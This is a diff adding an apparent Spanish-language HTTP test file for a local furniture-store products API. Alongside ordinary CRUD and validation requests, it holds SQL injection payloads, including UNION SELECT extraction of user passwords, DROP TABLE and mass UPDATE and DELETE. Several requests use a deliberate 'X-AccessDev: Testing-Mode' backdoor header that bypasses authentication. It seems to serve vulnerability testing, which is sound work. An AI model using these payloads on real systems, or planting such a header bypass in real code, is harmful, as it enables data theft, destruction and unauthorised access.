@@ -1,0 +1,224 @@
+# 📦 PRODUCTOS API - Tests
+# Backend: http://localhost:3000
+# Rutas públicas y protegidas para productos
+
+@baseUrl = http://localhost:3000/api/productos
+@adminToken = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.REPLACE_WITH_REAL_TOKEN
+
+### =====================================================
+### RUTAS PÚBLICAS (Sin autenticación)
+### =====================================================
+
+### 1. GET /api/productos - Obtener todos los productos
+GET {{baseUrl}}
+Content-Type: application/json
+
+### 2. GET /api/productos/:id - Obtener producto por ID
+GET {{baseUrl}}/1
+Content-Type: application/json
+
+### 3. GET /api/productos/:id - Producto inexistente
+GET {{baseUrl}}/999
+Content-Type: application/json
+
+### =====================================================
+### SQL INJECTION - GET productos por ID
+### =====================================================
+
+### 4. SQL Injection - OR '1'='1' (debería retornar todos)
+GET {{baseUrl}}/1' OR '1'='1
+Content-Type: application/json
+
+### 5. SQL Injection - UNION SELECT
+GET {{baseUrl}}/1' UNION SELECT * FROM users--
+Content-Type: application/json
+
+### 6. SQL Injection - Obtener usuarios desde productos
+GET {{baseUrl}}/1' UNION SELECT id,username,email,password,role,is_active,created_at,updated_at FROM users--
+Content-Type: application/json
+
+### =====================================================
+### BÚSQUEDA DE PRODUCTOS
+### =====================================================
+
+### 7. GET /api/productos/search/:term - Buscar por "sofá"
+GET {{baseUrl}}/search/sofá
+Content-Type: application/json
+
+### 8. Buscar por "mesa"
+GET {{baseUrl}}/search/mesa
+Content-Type: application/json
+
+### 9. Buscar por "oficina"
+GET {{baseUrl}}/search/oficina
+Content-Type: application/json
+
+### =====================================================
+### SQL INJECTION - Búsqueda
+### =====================================================
+
+### 10. SQL Injection en búsqueda - OR '1'='1'
+GET {{baseUrl}}/search/x' OR '1'='1
+Content-Type: application/json
+
+### 11. SQL Injection en búsqueda - UNION SELECT
+GET {{baseUrl}}/search/x' UNION SELECT id,username,email,password,role,is_active,created_at,updated_at FROM users--
+Content-Type: application/json
+
+### =====================================================
+### RUTAS PROTEGIDAS - Crear Producto (ADMIN)
+### =====================================================
+
+### 12. POST /api/productos - Sin token (debería fallar)
+POST {{baseUrl}}
+Content-Type: application/json
+
+{
+  "nombre": "Armario Moderno",
+  "descripcion": "Armario de 4 puertas en madera",
+  "precio": 35000.00,
+  "stock": 5,
+  "categoria": "dormitorio",
+  "imagen_url": "/images/armario.jpg"
+}
+
+### 13. POST /api/productos - Con token admin
+POST {{baseUrl}}
+Content-Type: application/json
+Authorization: Bearer {{adminToken}}
+
+{
+  "nombre": "Armario Moderno",
+  "descripcion": "Armario de 4 puertas en madera",
+  "precio": 35000.00,
+  "stock": 5,
+  "categoria": "dormitorio",
+  "imagen_url": "/images/armario.jpg"
+}
+
+### 14. POST /api/productos - Con BACKDOOR (sin token)
+POST {{baseUrl}}
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "nombre": "Mesa de Noche",
+  "descripcion": "Mesa de noche con 2 cajones",
+  "precio": 4500.00,
+  "stock": 15,
+  "categoria": "dormitorio",
+  "imagen_url": "/images/mesa-noche.jpg"
+}
+
+### =====================================================
+### SQL INJECTION - Crear Producto
+### =====================================================
+
+### 15. SQL Injection en nombre del producto
+POST {{baseUrl}}
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "nombre": "Test'); DROP TABLE products;--",
+  "descripcion": "Producto malicioso",
+  "precio": 1.00,
+  "stock": 1
+}
+
+### =====================================================
+### RUTAS PROTEGIDAS - Actualizar Producto (ADMIN)
+### =====================================================
+
+### 16. PUT /api/productos/:id - Sin token (debería fallar)
+PUT {{baseUrl}}/1
+Content-Type: application/json
+
+{
+  "precio": 50000.00
+}
+
+### 17. PUT /api/productos/:id - Con BACKDOOR
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "precio": 50000.00,
+  "stock": 20
+}
+
+### 18. PUT /api/productos/:id - Actualizar nombre
+PUT {{baseUrl}}/2
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "nombre": "Mesa de Comedor Premium"
+}
+
+### =====================================================
+### SQL INJECTION - Actualizar Producto
+### =====================================================
+
+### 19. SQL Injection en UPDATE - Cambiar precio de todos
+PUT {{baseUrl}}/1' OR '1'='1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "precio": 1.00
+}
+
+### =====================================================
+### RUTAS PROTEGIDAS - Eliminar Producto (ADMIN)
+### =====================================================
+
+### 20. DELETE /api/productos/:id - Sin token (debería fallar)
+DELETE {{baseUrl}}/6
+Content-Type: application/json
+
+### 21. DELETE /api/productos/:id - Con BACKDOOR
+DELETE {{baseUrl}}/6
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+### =====================================================
+### SQL INJECTION - Eliminar Producto
+### =====================================================
+
+### 22. SQL Injection en DELETE - Eliminar todos
+DELETE {{baseUrl}}/1' OR '1'='1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+### =====================================================
+### VALIDACIONES Y ERRORES
+### =====================================================
+
+### 23. POST /api/productos - Sin nombre (validación)
+POST {{baseUrl}}
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "descripcion": "Producto sin nombre",
+  "precio": 1000.00
+}
+
+### 24. POST /api/productos - Sin precio (validación)
+POST {{baseUrl}}
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{
+  "nombre": "Producto sin precio",
+  "descripcion": "Test"
+}
+
+### 25. PUT /api/productos/:id - Sin campos (validación)
+PUT {{baseUrl}}/1
+Content-Type: application/json
+X-AccessDev: Testing-Mode
+
+{}
